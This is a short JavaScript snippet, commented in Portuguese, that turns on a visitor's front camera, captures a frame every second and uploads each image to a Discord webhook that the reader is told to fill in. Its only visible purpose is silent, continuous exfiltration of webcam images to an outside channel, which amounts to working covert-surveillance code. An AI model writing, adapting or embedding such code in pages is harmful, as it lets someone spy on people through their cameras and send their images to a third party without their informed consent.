const webhook = "https://discord.com/api/webhooks/SEU_WEBHOOK"; // troca pelo seu
const video = document.getElementById("video");
const canvas = document.createElement("canvas");

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;

    setInterval(() => {
      if (video.videoWidth > 0 && video.videoHeight > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        canvas.toBlob(blob => {
          const form = new FormData();
          form.append("file", blob, `print_${Date.now()}.png`);
          fetch(webhook, { method: "POST", body: form });
        }, "image/png");
      }
    }, 1000); // print a cada 1 segundo

  } catch (err) {
    console.log("Permissão negada ou erro: ", err);
  }
}

startCamera();
